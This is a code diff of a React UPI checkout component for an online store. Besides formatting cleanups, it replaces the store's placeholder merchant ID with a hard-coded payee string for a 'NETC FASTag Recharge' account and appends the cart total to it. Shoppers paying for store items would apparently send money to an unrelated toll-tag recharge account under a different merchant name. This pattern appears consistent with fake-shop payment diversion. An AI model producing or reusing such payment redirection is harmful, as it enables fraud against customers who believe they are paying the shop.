@@ -1,18 +1,17 @@
 // UPIPaymentOptions.jsx
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { calculateCartTotals } from "../../utils/cartUtils";
 
-const upiId = "merchant@upi";
-const merchantName = "My Store";
-const tr = "TRX12345";
-const mc = "0000";
+// Your custom payment URL format
+const customPaymentUrl =
+  "//pay?ver=01&mode=01&pa=netc.34161FA820328AA2D2560DE0@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";
 
 const formatNumberWithCommas = (num) =>
   num.toLocaleString("en-IN", { maximumFractionDigits: 2 });
 
 const UPIPaymentOptions = () => {
   const [selected, setSelected] = useState("upi");
-  const [cartTotals, setCartTotals] = React.useState({
+  const [cartTotals, setCartTotals] = useState({
     totalMRP: 0,
     totalDiscount: 0,
     totalAmount: 0,
@@ -20,19 +19,18 @@ const UPIPaymentOptions = () => {
     packagingFee: 0,
     finalAmount: 0,
     totalItems: 0,
-    savings: 0
+    savings: 0,
   });
 
-  React.useEffect(() => {
+  useEffect(() => {
     updateCartTotals();
-    
-    // Listen for cart updates
+
     const handleCartUpdate = () => {
       updateCartTotals();
     };
-    
-    window.addEventListener('cartUpdated', handleCartUpdate);
-    return () => window.removeEventListener('cartUpdated', handleCartUpdate);
+
+    window.addEventListener("cartUpdated", handleCartUpdate);
+    return () => window.removeEventListener("cartUpdated", handleCartUpdate);
   }, []);
 
   const updateCartTotals = () => {
@@ -41,14 +39,7 @@ const UPIPaymentOptions = () => {
   };
 
   const generateLink = (scheme) => {
-    const totalAmount = cartTotals.finalAmount;
-    return (
-    `${scheme}://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(
-      merchantName
-    )}&am=${totalAmount}&tr=${encodeURIComponent(tr)}&cu=INR&mc=${encodeURIComponent(
-      mc
-    )}&qrMedium=04&tn=PaymenttoPRODUCTS`
-    );
+    return `${scheme}:${customPaymentUrl}&am=${cartTotals.finalAmount}`;
   };
 
   const paymentOptions = [
@@ -68,7 +59,7 @@ const UPIPaymentOptions = () => {
       id: "g-pay",
       label: "Google Pay",
       img: "assets/images/svg/gpay.svg",
-      scheme: "tez",
+      scheme: "upi",
     },
     {
       id: "upi",
@@ -104,12 +95,9 @@ const UPIPaymentOptions = () => {
           />
         </svg>
       </div>
-      <div className="z-10 bg-white rounded-lg mb-5  mx-auto ">
+      <div className="z-10 bg-white rounded-lg mb-5 mx-auto">
         {paymentOptions.map(({ id, label, img, scheme }) => (
-          <div
-            key={id}
-            className="border-b border-gray-200 last:border-b-0 py-2"
-          >
+          <div key={id} className="border-b border-gray-200 last:border-b-0 py-2">
             <div
               className="flex items-center justify-between px-3 py-2 pr-4 cursor-pointer"
               onClick={() => setSelected(id)}
@@ -128,11 +116,7 @@ const UPIPaymentOptions = () => {
                   onChange={() => setSelected(id)}
                   aria-label={label}
                 />
-
-                <label
-                  htmlFor={id}
-                  className="text-sm font-medium text-gray-900"
-                >
+                <label htmlFor={id} className="text-sm font-medium text-gray-900">
                   {label}
                 </label>
               </div>
@@ -145,8 +129,7 @@ const UPIPaymentOptions = () => {
                   className="w-full bg-yellow-400 mt-2 text-black font-semibold py-2 px-4 rounded text-sm"
                   onClick={() => (window.location.href = generateLink(scheme))}
                 >
-                  Pay ₹
-                  {cartTotals.finalAmount.toLocaleString()}
+                  Pay ₹{formatNumberWithCommas(cartTotals.finalAmount)}
                 </button>
               </div>
             )}
